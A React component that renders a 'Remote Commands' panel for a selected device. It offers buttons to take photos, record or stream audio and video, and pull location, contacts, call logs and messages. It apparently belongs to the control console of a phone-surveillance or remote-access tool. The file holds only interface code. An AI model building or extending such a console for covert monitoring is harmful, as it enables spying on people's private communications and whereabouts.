import { useState } from 'react';
import {
  Camera,
  Mic,
  Video,
  Map,
  Users,
  Phone,
  MessageSquare,
} from 'lucide-react';
import { LucideIcon } from 'lucide-react';
import DurationInputModal from './DurationInputModal';

interface CommandButton {
  action: string;
  label: string;
  icon: LucideIcon;
  iconColor: string;
  requiresDuration?: boolean;
}

interface CommandButtonsProps {
  onCommandClick: (action: string, duration?: number) => void;
  disabled?: boolean;
}

const commandButtons: CommandButton[] = [
  { action: 'take_photo', label: 'Take Photo', icon: Camera, iconColor: 'text-blue-500' },
  { action: 'record_audio', label: 'Record Audio', icon: Mic, iconColor: 'text-green-500', requiresDuration: true },
  { action: 'record_video', label: 'Record Video', icon: Video, iconColor: 'text-purple-500', requiresDuration: true },
  { action: 'get_location', label: 'Get Location', icon: Map, iconColor: 'text-orange-500' },
  { action: 'get_contacts', label: 'Get Contacts', icon: Users, iconColor: 'text-indigo-500' },
  { action: 'get_call_logs', label: 'Get Call Logs', icon: Phone, iconColor: 'text-pink-500' },
  { action: 'get_messages', label: 'Get Messages', icon: MessageSquare, iconColor: 'text-teal-500' },
  { action: 'stream_audio', label: 'Stream Audio', icon: MessageSquare, iconColor: 'text-teal-500', requiresDuration: true },
  { action: 'stream_video', label: 'Stream Video', icon: MessageSquare, iconColor: 'text-teal-500', requiresDuration: true },
];

export default function CommandButtons({ onCommandClick, disabled = false }: CommandButtonsProps) {
  const [isDurationModalOpen, setIsDurationModalOpen] = useState(false);
  const [pendingAction, setPendingAction] = useState<string>('');

  const handleCommandClick = (action: string, requiresDuration?: boolean) => {
    if (requiresDuration) {
      setPendingAction(action);
      setIsDurationModalOpen(true);
    } else {
      onCommandClick(action);
    }
  };

  const handleDurationConfirm = (duration: number) => {
    onCommandClick(pendingAction, duration);
    setPendingAction('');
  };

  const handleDurationModalClose = () => {
    setIsDurationModalOpen(false);
    setPendingAction('');
  };

  return (
    <>
      <div className="bg-white rounded-lg border border-gray-200">
        <div className="px-6 py-4 border-b border-gray-200">
          <h2 className="text-lg font-semibold text-gray-900">Remote Commands</h2>
          <p className="text-sm text-gray-600">Send commands to the selected device</p>
        </div>

        <div className="p-6">
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-10 gap-4">
            {commandButtons.map(({ action, icon: Icon, label, iconColor, requiresDuration }) => (
              <button
                key={action}
                onClick={() => handleCommandClick(action, requiresDuration)}
                disabled={disabled}
                className={`flex flex-col items-center gap-3 p-3 rounded-lg bg-white border border-gray-200 hover:border-gray-300 hover:shadow-md transition-all ${disabled ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'
                  }`}
              >
                <Icon className={`h-5 w-5 ${iconColor}`} />
                <small className="text-sm text-gray-700">{label}</small>
              </button>
            ))}
          </div>
        </div>
      </div>

      <DurationInputModal
        isOpen={isDurationModalOpen}
        onClose={handleDurationModalClose}
        onConfirm={handleDurationConfirm}
        action={pendingAction}
        actionLabel={commandButtons.find(btn => btn.action === pendingAction)?.label || ''}
      />
    </>
  );
}

